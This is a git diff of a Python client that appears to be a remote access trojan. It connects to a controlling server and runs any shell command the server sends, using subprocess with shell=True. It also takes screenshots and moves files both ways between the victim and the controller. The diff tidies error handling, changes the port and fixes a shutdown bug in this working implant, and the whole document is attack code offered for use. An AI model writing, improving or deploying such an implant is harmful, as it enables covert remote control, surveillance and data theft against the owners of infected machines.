@@ -5,9 +5,14 @@ import time
 import subprocess
 import mss
 
+#TODO:
+#Error handing
+    # Shell cmds
+    # File management
+    
 
 
-address = ("0.0.0.0", 5000)
+address = ("0.0.0.0", 3000)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -19,9 +24,7 @@ def take_screen_shot():
 
 def recv(buff_size=1024):
     data_size = int(server_con.recv(12).decode())
-    if not data_size:
-        return b''
-
+    
     data = bytes()
     while len(data) < data_size:
         data += server_con.recv(buff_size)
@@ -39,57 +42,65 @@ def upload_file(file_name):
         with open(file_name, "rb") as file:
             file_data = file.read()
             send(file_data)
+        done = recv().decode()
+        print(done)
+        
     except:
         print("Error opening file")
         send(b'')
 
 def download_file(file_name, file_path):
-    print(os.getcwd())
     file_data = recv()
     if not file_data:
         print("Could not download file...")
         return
-
-    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
-    file.write(file_data)
-    file.close()
+        
+    try:
+        file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
+        file.write(file_data)
+        file.close()
+        send(b"DONE")
+    except OSError as e:
+        print(e)
 
 def open_shell():
     while True:
         print("waiting for cmd...")
         data = recv()
-        str_msg = ""
-
-        if data.decode() == "exit":
+        str_msg = b""
+        
+        if not data:
+            continue
+        
+        data = data.decode()
+        
+        if data == "exit":
             break
-        elif data.decode()[:2] == "cd":
-            dir = data.decode()[3:]
+        elif data[:2] == "cd":
+            dir = data[3:]
             try:
                 os.chdir(dir)
-            except:
-                str_msg = "Error: " + str(sys.exc_info()[0])
+            except FileNotFoundError as e:
+                str_msg = str(e).encode()
             else:
-                str_msg = os.getcwd()
+                str_msg = os.getcwd().encode()
 
-        elif data.decode()[:2] == "dw":
-            file_name = data.decode()[3:]
+        elif data[:2] == "dw":
+            file_name = data[3:]
             print(f"Uploading File...{file_name}")
             upload_file(file_name)
             continue
 
-        elif data.decode()[:2] == "up":
-            file_name = data.decode()[3:]
-            print(os.getcwd())
-            download_file(file_name=file_name, file_path=os.getcwd())
+        elif data[:2] == "up":
+            file_name = data[3:]
             print(f"Downloading File...{file_name}")
+            download_file(file_name=file_name, file_path=os.getcwd())
             continue
 
-        else:
-            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-            str_msg = output[0].decode()
+        output = subprocess.Popen(f'{data}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+        str_msg = output[0] + output[1]
 
-
-        send(str_msg.encode())
+        send(str_msg)
 
 
 
@@ -124,7 +135,7 @@ def main():
         elif choice == "4":
             keep_alive = recv().decode()
             if keep_alive.lower() == "y" or keep_alive.lower() == "yes":
-                server.con.shutdown(socket.SHUT_WR)
+                server_con.shutdown(socket.SHUT_WR)
                 server_con.close()
                 time.sleep(5)
                 establish_connection(address)
